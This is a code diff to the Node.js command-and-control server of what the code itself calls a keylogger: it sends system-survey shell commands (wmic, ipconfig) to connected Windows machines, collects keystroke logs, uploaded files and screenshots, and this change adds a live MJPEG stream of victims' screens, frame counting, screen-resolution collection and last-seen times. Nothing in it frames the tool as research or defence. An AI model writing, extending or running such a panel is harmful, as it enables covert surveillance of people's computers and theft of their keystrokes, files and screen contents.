@@ -7,6 +7,8 @@ const render = require("./js/views.js");
 const client = require("./js/client.js");
 const settings = require("./js/settings.js");
 const utils = require("./js/utils.js");
+const nocache = require("nocache");
+const sharp = require('sharp');
 
 const fileUpload = require('express-fileupload');
 
@@ -23,21 +25,30 @@ const io = socketio(server, {
 
 settings.read();
 console.log(settings.getAll())
+var delay = 10;
+let lastScreenshot = [];
+let fps = [];
+
+setInterval(() => {
+  Object.keys(fps).forEach(key => {
+    io.emit("framecount", {
+      id: key,
+      fps: fps[key],
+    });
+    delete fps[key];
+
+  });
+},1000)
 
 
 function getOfflineClients(){
-
-
   fs.readdirSync("./clients").forEach((name) => {
     client.addClient(name);
-    //console.log(file);
   });
   console.table(client.getAllClients());
-
 }
 
 getOfflineClients();
-var delay = 10;
 
 app.use(express.json());
 
@@ -46,6 +57,7 @@ app.use(
     extended: true,
   })
 );
+app.set('etag', false)
 
 app.use(express.static("views"));
 app.use(express.static("clients"));
@@ -53,6 +65,7 @@ app.use(fileUpload());
 app.use(express.static(__dirname + "/public")); //Set public files to use
 
 app.set("view engine", "ejs");
+app.use(nocache());
 
 app.use(
   session({
@@ -88,7 +101,26 @@ app.post("/ftp", render.ftp_upload);
 app.get("/logs/:ClientName/:FileName?", render.logs);
 
 app.post("/logout", render.logout);
+app.get('/mjpeg/:ClientId', (req, res) => {
+  // Set MJPEG headers
+  var id = req.params.ClientId; 
+  res.writeHead(200, {
+    'Content-Type': 'multipart/x-mixed-replace; boundary=--myboundary'
+  });
 
+  const sendFrame = () => {
+    if (lastScreenshot[id]) {
+      res.write(`--myboundary\nContent-Type: image/jpeg\nContent-Length: ${lastScreenshot[id].length}\n\n`);
+      res.write(lastScreenshot[id]);
+    }
+
+    // Schedule the next frame to be sent
+    setTimeout(sendFrame, 50);
+  }
+
+  // Start sending frames
+  sendFrame();
+});
 io.of("/extension").on("connection", (socket) => {
   socket.on("join", (msg) => {
     console.log("Dolaczyl " + socket.id + " " + msg);
@@ -106,6 +138,7 @@ io.of("/extension").on("connection", (socket) => {
   });
 });
 io.on("connection", (socket) => {
+  
   socket.on("join", (msg) => {
     // let info = msg.split(":");
     // socket.ip = info[0];
@@ -113,8 +146,7 @@ io.on("connection", (socket) => {
     // socket.version = info[2];
     socket.joined = false;
     socket.version = msg;  //-- for client version 1.1
-
-    socket.emit("command", 'wmic computersystem get name, TotalPhysicalMemory /Value && wmic os get caption /Value && ipconfig | find "IPv4" | find /N ":"  | find "[1]"');
+    socket.emit("command", 'wmic computersystem get name, TotalPhysicalMemory /Value && wmic os get caption /Value && wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /Value && ipconfig | find "IPv4" | find /N ":"  | find "[1]"');
   });
 
   socket.on("logs", async (msg) => {
@@ -159,13 +191,14 @@ io.on("connection", (socket) => {
       });
     }
   });
-
   socket.on("screenshotResult", async (msg) => {
-
-    io.emit("screenshotResult", {
-      id: socket.id,
-      response: msg,
-    });
+    lastScreenshot[socket.id] = await sharp(Buffer.from(msg, 'base64')).jpeg().toBuffer();
+    if(fps[socket.id]){
+      fps[socket.id] = fps[socket.id]+1;
+    } else {
+      fps[socket.id] = 1
+    }
+    
   });
 
   socket.on("delete", async (msg) => {
@@ -175,17 +208,34 @@ io.on("connection", (socket) => {
     });
     client.removeClient(msg.clientname);
   });
+
   socket.on("delete-ftp", async (msg) => {
     fs.rmSync(`./ftp/${msg.filename}`, {
       recursive: true,
     });
   });
+  
   socket.on("disconnect", () => {
     if (socket.name != null) {
       //if socket is a keylogger instance
       console.log("Wyszedl: " + socket.name);
 
       client.getClientByName(socket.name).status = false;
+
+
+
+      var date_ob = new Date();
+      var day = ("0" + date_ob.getDate()).slice(-2);
+      var month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
+      var year = date_ob.getFullYear();
+      var hours = date_ob.getHours();
+      var minutes = date_ob.getMinutes();
+      var seconds = date_ob.getSeconds();
+        
+      var dateTime = "("+year + "-" + month + "-" + day + " " + hours + ":" + minutes + ":" + seconds+")";
+
+      client.getClientByName(socket.name).lastseen = dateTime;
+
       io.emit("leave", {name: socket.name})
 
     }
@@ -196,6 +246,8 @@ function parseClientInfo(decodedString, socket) {
   let ram = '';
   let osName = '';
   let ip = '';
+  let height = '';
+  let width = '';
   const outputLines = decodedString.split("\n");
 
 
@@ -207,7 +259,14 @@ function parseClientInfo(decodedString, socket) {
     const osNameLine = outputLines.find((line) => line.startsWith("Caption="));
     osName = osNameLine.split("=")[1].trim();
   } catch (e) {}
-
+  try {
+    const heightLine = outputLines.find((line) => line.startsWith("CurrentVerticalResolution="));
+    height = heightLine.split("=")[1].trim();
+  } catch (e) {}
+  try {
+    const widthLine = outputLines.find((line) => line.startsWith("CurrentHorizontalResolution="));
+    width = widthLine.split("=")[1].trim();
+  } catch (e) {}
   try{
     const ipLine = outputLines.find((line) => line.startsWith("[1]"));
     ip = ipLine.split(":")[1].trim()
@@ -236,8 +295,11 @@ function parseClientInfo(decodedString, socket) {
   emmet.version = socket.version;
   emmet.system = osName;
   emmet.id = socket.id;
+  emmet.height = height;
+  emmet.width = width;
 
   console.table(client.getAllClients());
+  console.log(client.getClientById(socket.id))
 
   io.emit("join", {name: socket.name})
 }
